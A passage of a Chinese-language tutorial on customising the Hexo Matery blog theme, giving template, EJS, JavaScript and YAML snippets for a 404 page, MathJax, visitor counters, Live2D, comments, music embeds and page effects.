class="headerlink" title="2.1 新建文章模板修改"></a>2.1 新建文章模板修改</h3><hr><p>首先为了新建文章方便，我们可以修改一下文章模板，建议将<code>/scaffolds/post.md</code>修改为如下代码：</p><pre><code>---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;author: img: coverImg: top: falsecover: falsetoc: truemathjax: falsepassword:summary:tags:categories:---</code></pre><p>Json</p><p>这样新建文章后 一些<code>Front-matter</code>参数不用你自己补充了，修改对应信息就可以了。</p><h3 id="2-2-添加404页面"><a href="#2-2-添加404页面" class="headerlink" title="2.2 添加404页面"></a>2.2 添加404页面</h3><hr><p>原来的主题没有<code>404</code>页面，我们加一个。首先在<code>/source/</code>目录下新建一个<code>404.md</code>，内容如下：</p><pre><code>title: 404date: 2019-08-5 16:41:10type: &quot;404&quot;layout: &quot;404&quot;description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;</code></pre><p>Json</p><p>然后在<code>/themes/matery/layout/</code>目录下新建一个<code>404.ejs</code>文件，内容如下：</p><pre><code>&lt;style type=&quot;text/css&quot;&gt;    /* don&#39;t remove. */    .about-cover &#123;        height: 75vh;    &#125;&lt;/style&gt;&lt;div class=&quot;bg-cover pd-header about-cover&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col s10 offset-s1 m8 offset-m2 l8 offset-l2&quot;&gt;                &lt;div class=&quot;brand&quot;&gt;                    &lt;div class=&quot;title center-align&quot;&gt;                        404                    &lt;/div&gt;                    &lt;div class=&quot;description center-align&quot;&gt;                        &lt;%= page.description %&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script&gt;    // 每天切换 banner 图.  Switch banner image every day.    $(&#39;.bg-cover&#39;).css(&#39;background-image&#39;, &#39;url(/medias/banner/&#39; + new Date().getDay() + &#39;.jpg)&#39;);&lt;/script&gt;</code></pre><p>Html</p><h3 id="2-3“关于”页面增加简历（可选）"><a href="#2-3“关于”页面增加简历（可选）" class="headerlink" title="2.3“关于”页面增加简历（可选）"></a>2.3“关于”页面增加简历（可选）</h3><hr><p>修改<code>/themes/matery/layout/about.ejs</code>，找到<code>&lt;div class=&quot;card&quot;&gt;</code>标签，然后找到它对应的<code>&lt;/div&gt;</code>标签，接在后面新增一个<code>card</code>，语句如下：</p><pre><code>&lt;div class=&quot;card&quot;&gt;    &lt;div class=&quot;card-content&quot;&gt;        &lt;div class=&quot;card-content article-card-content&quot;&gt;                &lt;div class=&quot;title center-align&quot; data-aos=&quot;zoom-in-up&quot;&gt;                    &lt;i class=&quot;fa fa-address-book&quot;&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;&lt;%- __(&#39;myCV&#39;) %&gt;                &lt;/div&gt;                &lt;div id=&quot;articleContent&quot; data-aos=&quot;fade-up&quot;&gt;                    &lt;%- page.content %&gt;                &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><p>Html</p><p>这样就会多出一张<code>card</code>，然后可以在<code>/source/about/index.md</code>下面写上你的简历了，当然这里的位置随你自己设置，你也可以把简历作为第一个<code>card</code>。</p><h3 id="2-4-数学公式渲染和代码高亮"><a href="#2-4-数学公式渲染和代码高亮" class="headerlink" title="2.4 数学公式渲染和代码高亮"></a>2.4 数学公式渲染和代码高亮</h3><hr><p><strong>2.4.1 解决mathjax与代码高亮的冲突</strong></p><p>如果你按照教程安装了代码高亮插件<code>hexo-prism-plugin</code>，单独使用是没有问题的，但如果你又使用了<code>mathjax</code>，并且按照网上教程，安装<code>kramed</code>插件并修改了<code>js</code>文件里的正则表达式（为了解决<code>markdown</code>和<code>mathjax</code>的语法冲突），那你的代码就无法高亮了。解决方法很简单，别用<code>kramed</code>插件了，还用原来自带的<code>marked</code>插件，直接改它的正则表达式就行了。</p><p><strong>2.4.2 加数学公式显示</strong></p><p>打开<code>/themes/matery/layout</code>中的<code>post.ejs</code>文件，在最下方粘贴如下代码：</p><pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;</code></pre><p>Javascript</p><p>由于<code>markdown</code>语法与<code>mathjax</code>语法存在冲突，所以还需要修改源文件。</p><p>打开<code>/node_modules/marked/lib</code>中的<code>marked.js</code>文件，第539行的<code>escape:</code>处替换成：</p><pre><code>escape: /^$[`*\[\]()#$+\-.!_&gt;])/</code></pre><p>Js</p><p>第553行的<code>em:</code>处替换成：</p><pre><code>em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</code></pre><p>Js</p><p>这时在文章里写数学公式基本没有问题了，但是要注意：<br><strong>数学公式中如果出现了连续两个{，中间一定要加空格！</strong></p><p>举个例子:<br>行内公式：y=f(x)y=f(x)<br>代码：</p><pre><code>$y = f(x)$</code></pre><p>Tex</p><p>行间公式：</p><p>y=fg1(x)y=fg1(x)</p><p>代码：</p><pre><code>\\[y = &#123;f_&#123; &#123;g_1&#125;&#125;&#125;(x)\\]</code></pre><p>Tex</p><blockquote><p>注意上面花括号之间有空格！</p></blockquote><h3 id="2-5-增加建站时间"><a href="#2-5-增加建站时间" class="headerlink" title="2.5 增加建站时间"></a>2.5 增加建站时间</h3><hr><p>修改<code>/themes/matery/layout/_partial</code>中的<code>footer.ejs</code>，在最后加上：</p><pre><code>&lt;script language=javascript&gt;    function siteTime() &#123;        window.setTimeout(&quot;siteTime()&quot;, 1000);        var seconds = 1000;        var minutes = seconds * 60;        var hours = minutes * 60;        var days = hours * 24;        var years = days * 365;        var today = new Date();        var todayYear = today.getFullYear();        var todayMonth = today.getMonth() + 1;        var todayDate = today.getDate();        var todayHour = today.getHours();        var todayMinute = today.getMinutes();        var todaySecond = today.getSeconds();        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)        year - 作为date对象的年份，为4位年份值        month - 0-11之间的整数，做为date对象的月份        day - 1-31之间的整数，做为date对象的天数        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数        minutes - 0-59之间的整数，做为date对象的分钟数        seconds - 0-59之间的整数，做为date对象的秒数        microseconds - 0-999之间的整数，做为date对象的毫秒数 */        var t1 = Date.UTC(2017, 09, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);        var diff = t2 - t1;        var diffYears = Math.floor(diff / years);        var diffDays = Math.floor((diff / days) - diffYears * 365);        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);        document.getElementById(&quot;sitetime&quot;).innerHTML = &quot;本站已运行 &quot; +diffYears+&quot; 年 &quot;+diffDays + &quot; 天 &quot; + diffHours + &quot; 小时 &quot; + diffMinutes + &quot; 分钟 &quot; + diffSeconds + &quot; 秒&quot;;    &#125;/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/    siteTime();&lt;/script&gt;</code></pre><p>Js</p><p>然后在合适的地方（比如<code>copyright</code>声明后面）加上下面的代码就行了：</p><pre><code>&lt;span id=&quot;sitetime&quot;&gt;&lt;/span&gt;</code></pre><p>Html</p><h3 id="2-6-修改不蒜子初始化计数"><a href="#2-6-修改不蒜子初始化计数" class="headerlink" title="2.6 修改不蒜子初始化计数"></a>2.6 修改不蒜子初始化计数</h3><hr><p>因为不蒜子至今未开放注册，所以没办法在官网修改初始化，只能自己动手了。和上一条一样，我们在<code>/themes/matery/layout/_partial</code>里的<code>footer.ejs</code>文件最后加上：</p><script>     $(document).ready(function () {      <span class="token keyword">var</span> int <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>fixCount<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 50ms周期检测函数</span>     <span class="token keyword">var</span> pvcountOffset <span class="token operator">=</span> <span class="token number">80000</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 初始化首次数据</span>     <span class="token keyword">var</span> uvcountOffset <span class="token operator">=</span> <span class="token number">20000</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">fixCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"busuanzi_container_site_pv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">!=</span> <span class="token string">"none"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#busuanzi_value_site_pv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#busuanzi_value_site_pv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> pvcountOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">clearInterval</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#busuanzi_container_site_pv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"display"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"none"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#busuanzi_value_site_uv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#busuanzi_value_site_uv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> uvcountOffset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 加上初始数据 </span>             <span class="token function">clearInterval</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 停止检测</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></script><p>Js</p><p>然后把上面几行有段代码：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) &#123; %&gt;    &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;        &lt;i class=&quot;fa fa-heart-o&quot;&gt;&lt;/i&gt;        本站总访问量 &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt;    &lt;/span&gt;&lt;% &#125; %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) &#123; %&gt;    &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;        人次,&amp;nbsp;访客数 &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt; 人.    &lt;/span&gt;&lt;% &#125; %&gt;</code></pre><p>Html</p><p>修改为：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) &#123; %&gt;    &lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:none&#39;&gt;        &lt;i class=&quot;fa fa-heart-o&quot;&gt;&lt;/i&gt;        本站总访问量 &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt;    &lt;/span&gt;&lt;% &#125; %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) &#123; %&gt;    &lt;span id=&quot;busuanzi_container_site_uv&quot; style=&#39;display:none&#39;&gt;        人次,&amp;nbsp;访客数 &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt; 人.    &lt;/span&gt;&lt;% &#125; %&gt;</code></pre><p>Html</p><p>其实就是增加了两个<code>style=&#39;display:none&#39;</code>而已。</p><h3 id="2-7-添加动漫人物"><a href="#2-7-添加动漫人物" class="headerlink" title="2.7 添加动漫人物"></a>2.7 添加动漫人物</h3><hr><p>其实三步就行了，不用像网上有些教程那么复杂。</p><p><strong>第一步：</strong></p><pre><code>npm install --save hexo-helper-live2d</code></pre><p>Bash</p><p><strong>第二步：</strong></p><pre><code>npm install live2d-widget-model-shizuku</code></pre><p>Bash</p><blockquote><p>这里的动漫模型可以改，只需要下载对应模型就行了，你可以官方仓库去看有哪些模型，下载你喜欢的就行。</p></blockquote><p><strong>第三步：</strong><br>在根目录配置文件中添加如下代码：</p><pre><code>live2d:    enable: true    scriptFrom: local    pluginRootPath: live2dw/    pluginJsPath: lib/    pluginModelPath: assets/    tagMode: false    log: false    model:        use: live2d-widget-model-shizuku    display:        position: right        width: 150        height: 300    mobile:        show: false    react:        opacity: 0.7</code></pre><p>Yml</p><p>然后<code>hexo g</code>再<code>hexo s</code>就能预览出效果了，但是有个注意的地方，<strong>这个动漫人物最好不要和不蒜子同时使用</strong>，不然不蒜子会显示不出来。至于解决办法后续更新。</p><blockquote><p><strong>解决动漫人物和不蒜子不能同时使用的<code>bug</code>（2019.08.11）</strong>：</p></blockquote><p>打开<code>themes\matery\layout\_partial</code>中的<code>footer.ejs</code>，将本站总访问量和访客数的代码改为如下：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) &#123; %&gt;          &lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:none&#39;&gt;&lt;/span&gt;        &lt;i class=&quot;fa fa-heart-o&quot;&gt;&lt;/i&gt;        本站总访问量 &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt;&lt;% &#125; %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) &#123; %&gt;    &lt;span id=&quot;busuanzi_container_site_uv&quot; style=&#39;display:none&#39;&gt;&lt;/span&gt;        人次,&amp;nbsp;访客数 &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;white-color&quot;&gt;&lt;/span&gt; 人.&lt;% &#125; %&gt;</code></pre><p>Js</p><p>变化就在下面两句，将源代码对应字段后面的<code>＜/span＞</code>写在前面了。</p><pre><code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:none&#39;&gt;&lt;/span&gt;&lt;span id=&quot;busuanzi_container_site_uv&quot; style=&#39;display:none&#39;&gt;&lt;/span&gt;</code></pre><p>Js</p><blockquote><p><strong>发现按照上面改了过后，又出现一个新<code>bug</code>：文章头部的阅读次数不显示了，解决办法：（2019.08.11）</strong>：</p></blockquote><p>打开<code>themes\matery\layout\_partial</code>中的<code>post-detail.ejs</code>，找到对应代码字段：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.enable) &#123; %&gt;    &lt;div id=&quot;busuanzi_container_page_pv&quot; class=&quot;info-break-policy&quot;&gt;        &lt;i class=&quot;fa fa-eye fa-fw&quot;&gt;&lt;/i&gt;&lt;%- __(&#39;readCount&#39;) %&gt;:&amp;nbsp;&amp;nbsp;        &lt;span id=&quot;busuanzi_value_page_pv&quot; &gt;&lt;/span&gt;    &lt;/div&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>修改为下面的就可以了：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.enable) &#123; %&gt;        &lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:none&#39;&gt;&lt;/span&gt;        &lt;i class=&quot;fa fa-eye fa-fw&quot;&gt;&lt;/i&gt;&lt;%- __(&#39;readCount&#39;) %&gt;:&amp;nbsp;&amp;nbsp;        &lt;span id=&quot;busuanzi_value_page_pv&quot; &gt;&lt;/span&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><h3 id="2-8-添加评论插件"><a href="#2-8-添加评论插件" class="headerlink" title="2.8 添加评论插件"></a>2.8 添加评论插件</h3><hr><p>由于这个主题自带了<code>gittalk</code>、<code>gitment</code>、<code>valine</code>等评论插件，所以我们只需要对应插件参数就行了，这个博客用的是<code>gittalk</code>，如下：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/13.png" alt="img"></p><p>当然也可以用其他评论插件，只需要配置对应项就是了，不是自带的可以照着网上的教程自己弄一个，类似的文章有很多，可以搜索关键字就行了。</p><h3 id="2-9-添加网易云音乐BGM"><a href="#2-9-添加网易云音乐BGM" class="headerlink" title="2.9 添加网易云音乐BGM"></a>2.9 添加网易云音乐BGM</h3><hr><p>写文章的时候，想插入一段<code>BGM</code>怎么办？</p><p>其实我们可以借助一些在线音乐的外链播放方式，首先打开网易云网页版，找到想听的歌曲，然后点击生成外链：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/14.png" alt="img"></p><p>可能你会遇到问题，比如点击生成外链会提示你由于版权原因，不能生成，那么可以用下面办法目前还有效，不知道后面会不会失效目前还有效，不知道后面会不会失效</p><ol><li>(以 <code>Chrome</code>为例，其他浏览器类似) 打开歌单页面，在“生成外链播放器”上右击，点击审查元素（检查）ctrl+shift+i；</li><li>接着找到生成外链播放器这段文字直接双击复制前面的<code>/outchain/2/20707408/</code></li></ol><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/15.png" alt="img"></p><ol><li>然后在浏览器地址栏修改歌单链接，示例：<a href="http://music.163.com/#//outchain/2/20707408/">http://music.163.com/#//outchain/2/20707408/</a></li><li>然后就转到外链设置页面了。</li></ol><p>复制如下代码：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/16.png" alt="img"></p><p>粘贴到文章对应位置就行了，为了美观，设置一下居中，具体代码如下：</p><pre><code>&lt;div align=&quot;middle&quot;&gt;这里粘贴刚刚复制的代码&lt;/div&gt;</code></pre><p>Html</p><h3 id="2-10-博客音乐板块"><a href="#2-10-博客音乐板块" class="headerlink" title="2.10 博客音乐板块"></a>2.10 博客音乐板块</h3><hr><p>如果我们自己写博客写疲劳了，想放松一下听听歌又不想切出博客主页，那么我们可以自己定制一个博客音乐播放界面，把自己喜欢的歌曲都放进来，这里用到是Aplayer插件，但是歌曲来源需要我们自己定义，但是，因为各大音乐平台，由于版权原因，很多歌曲是不支持外链播放的，难道我们就必须每首歌下载然后上传云空间，再获取词曲封面么？这就比较麻烦了。其实不然，研究了半个小时，我发现可以采取下面的办法，很方便：</p><ul><li>首先我们找到网易云在线平台，任意找到一首歌点进去播放，可以在地址栏拿到音乐<code>ID</code>号</li><li>然后通过下面网址：<a href="http://music.163.com/song/media/outer/url?id=XXXXXX.mp3%EF%BC%8C">http://music.163.com/song/media/outer/url?id=XXXXXX.mp3，</a> <code>XXXXXX</code>就是歌曲<code>ID</code>号，每一首歌我们只需要换掉这个<code>ID</code>号就行了,就相当于每一首的外链了</li><li>最后封面图也可以按<code>F12</code>去找页面元素的链接，填到对应的<code>musics.jason</code>文件中就可以，批量填入，听到好听的歌曲随时更换随时新增，很方便。</li></ul><p>操作如下图：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/17.png" alt="img"></p><h3 id="2-11-增加emoji支持"><a href="#2-11-增加emoji支持" class="headerlink" title="2.11 增加emoji支持"></a>2.11 增加emoji支持</h3><hr><p>为博客新增对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：:smile: <code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre><code>npm install hexo-filter-github-emojis --save</code></pre><p>Bash</p><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre><code>githubEmojis:  enable: true  className: github-emoji  inject: true  styles:  customEmojis:</code></pre><p>Yaml</p><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。<br>如下图：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/18.gif" alt="img"></p><p><strong>emoji支持</strong></p><h3 id="2-12-Valine评论模块修改"><a href="#2-12-Valine评论模块修改" class="headerlink" title="2.12 Valine评论模块修改"></a>2.12 Valine评论模块修改</h3><hr><p><code>matery</code>主题已经集成<code>Valine</code>评论模块，在主题配置文件.yml中配置相应的字段就行了。<code>enable: true</code>，<code>XXX</code>字段是需要自己注册登录<code>leancloud</code>官网，创建应用然后获取<code>appId</code>和<code>appKey</code>，其他参数根据自己的需求修改就是，如下：</p><pre><code>valine:  enable: true  appId: XXXXXXXXXXXXXXXXXXXXX  appKey: XXXXXXXXXXXXXXXXXXXX  notify: true  verify: true  visitor: true  avatar: &#39;mm&#39; # Gravatar style : mm/identicon/monsterid/wavatar/retro/hide  pageSize: 10  placeholder: &#39;just go go&#39; # Comment Box placeholder</code></pre><p>Yml</p><blockquote><p>注意：<code>Valine</code>用在<code>matery</code>主题上有个<code>bug</code>就是第一条评论位置会错位</p></blockquote><p>如下图：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/19.png" alt="img"></p><p><strong>位置错位</strong></p><p>解决办法：<br><code>F12</code>开发者模式，控制台定位<code>bug</code>位置，修改参数，调整对应主题源文件参数，得以解决，如下图示：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/20.png" alt="img"></p><p><strong>定位bug位置</strong></p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/21.png" alt="img"></p><p><strong>修改图示</strong></p><h3 id="2-13-添加博客动态标签"><a href="#2-13-添加博客动态标签" class="headerlink" title="2.13 添加博客动态标签"></a>2.13 添加博客动态标签</h3><hr><p>原理就是给博客增加一个事件判断，如下图所示：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/40.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/41.png" alt="img"></p><p>打开博客主题文件夹，路径：<code>themes/matery/layout/layout.ejs</code>，在对应位置添加如下代码：</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    var OriginTitile = document.title,        st;    document.addEventListener(&quot;visibilitychange&quot;, function () &#123;        document.hidden ? (document.title = &quot;看不见我🙈~看不见我🙈~&quot;, clearTimeout(st)) : (document.title =            &quot;(๑•̀ㅂ•́) ✧被发现了～&quot;, st = setTimeout(function () &#123;                document.title = OriginTitile            &#125;, 3e3))    &#125;)&lt;/script&gt;</code></pre><p>Js</p><p>然后 <code>hexo clean</code> &amp;&amp; <code>hexo g</code> 即可。</p><h3 id="2-14-添加鼠标点击烟花爆炸效果"><a href="#2-14-添加鼠标点击烟花爆炸效果" class="headerlink" title="2.14 添加鼠标点击烟花爆炸效果"></a>2.14 添加鼠标点击烟花爆炸效果</h3><hr><p>在 /themes/matery/source/js 新建文件 fireworks.js，并添加如下代码</p><p><a href="http://49.235.106.229/js/fireworks.js">Download Now</a></p><p>然后在 /themes/matery/layout/_partial/footer.ejs 中添加如下代码：</p><pre><code>&lt;% if (theme.fireworks.enable) &#123; %&gt;&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>在主题配置文件 .yml中配置:</p><pre><code># 鼠标点击烟花爆炸动效fireworks:  enable: true</code></pre><p>Yml</p><h3 id="2-15-添加页面樱花飘落动效"><a href="#2-15-添加页面樱花飘落动效" class="headerlink" title="2.15 添加页面樱花飘落动效"></a>2.15 添加页面樱花飘落动效</h3><hr><p>在 /themes/matery/source/js 新建文件 sakura.js，并添加如下代码</p><p><a href="http://49.235.106.229/js/sakura.js">Download Now</a></p><p>然后在 /themes/matery/layout/_partial/head.ejs 中添加如下代码：</p><pre><code>&lt;% if (theme.sakura.enable) &#123; %&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    //只在桌面版网页启用特效    var windowWidth = $(window).width();    if (windowWidth &gt; 768) &#123;        document.write(&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;/script&gt;&#39;);    &#125;    &lt;/script&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>在主题配置文件 .yml中配置:</p><pre><code># 页面樱花飘落动效sakura:  enable: true</code></pre><p>Yml</p><h3 id="2-16-添加鼠标点击文字特效"><a href="#2-16-添加鼠标点击文字特效" class="headerlink" title="2.16 添加鼠标点击文字特效"></a>2.16 添加鼠标点击文字特效</h3><hr><p>在 /themes/matery/source/js 新建文件 wenzi.js，并添加如下代码</p><p><a href="http://49.235.106.229/js/wenzi.js">Download Now</a></p><p>然后在 /themes/matery/layout/_partial/head.ejs 中添加如下代码：</p><pre><code>&lt;% if (theme.wenzi.enable) &#123; %&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    //只在桌面版网页启用特效    var windowWidth = $(window).width();    if (windowWidth &gt; 768) &#123;        document.write(&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/wenzi.js&quot;&gt;&lt;/script&gt;&#39;);    &#125;    &lt;/script&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>在主题配置文件 .yml中配置:</p><pre><code># 页面樱花飘落动效wenzi:  enable: true</code></pre><p>Yml</p><h3 id="2-17-添加页面雪花飘落动效"><a href="#2-17-添加页面雪花飘落动效" class="headerlink" title="2.17 添加页面雪花飘落动效"></a>2.17 添加页面雪花飘落动效</h3><hr><p>在 /themes/matery/source/js 新建文件 xuehuapiaoluo.js，并添加如下代码</p><p><a href="http://49.235.106.229/js/xuehuapiaoluo.js">Download Now</a></p><p>然后在 /themes/matery/layout/_partial/head.ejs 中添加如下代码：</p><pre><code>&lt;% if (theme.xuehuapiaoluo.enable) &#123; %&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    //只在桌面版网页启用特效    var windowWidth = $(window).width();    if (windowWidth &gt; 768) &#123;        document.write(&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/xuehuapiaoluo.js&quot;&gt;&lt;/script&gt;&#39;);    &#125;    &lt;/script&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>在主题配置文件 .yml中配置:</p><pre><code># 页面樱花飘落动效xuehuapiaoluo:  enable: true</code></pre><p>Yml</p><h3 id="2-18-添加博客天气插件"><a href="#2-18-添加博客天气插件" class="headerlink" title="2.18 添加博客天气插件"></a>2.18 添加博客天气插件</h3><hr><p>在搜寻插件的过程中无意间用 google 搜到的一个网站，使用非常简单，在这里附上插件添加的方法</p><p>中国天气网：<a href="https://cj.weather.com.cn/plugin/pc">https://cj.weather.com.cn/plugin/pc</a></p><p>选择自定义插件—&gt;自定义样式——&gt;生成代码，然后会生成这样一段代码</p><pre><code>&lt;!-- Weather Widget --&gt; &lt;script type=&quot;text/javascript&quot;&gt; WIDGET = &#123;FID: &#39;your FID&#39;&#125;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;&gt;&lt;/script&gt;</code></pre><p>Html</p><p>在 /themes/matery/source/layout/_widget 新建文件 weather.ejs，把上面生成的代码添加进入,可以设置只有桌面端显示,如下修改:</p><pre><code>&lt;!-- 天气接口  洪卫 shw2018 add 2019.09.09 --&gt;&lt;script type=&quot;text/javascript&quot;&gt;  WIDGET = &#123;FID: &#39;1tFpFZ5Mtj&#39;&#125;&lt;/script&gt;&lt;!-- &lt;script type=&quot;text/javascript&quot; src=&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;&gt;&lt;/script&gt; --&gt;&lt;script type=&quot;text/javascript&quot;&gt;  //只在桌面版网页启用特效  var windowWidth = $(window).width();  if (windowWidth &gt; 768) &#123;      document.write(&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;&gt;&lt;\/script&gt;&#39;);  &#125;  &lt;/script&gt;</code></pre><p>Html</p><p>然后在 /themes/matery/layout/_partial/layout.ejs 中添加如下代码：</p><pre><code>&lt;!-- 天气接口控件  洪卫 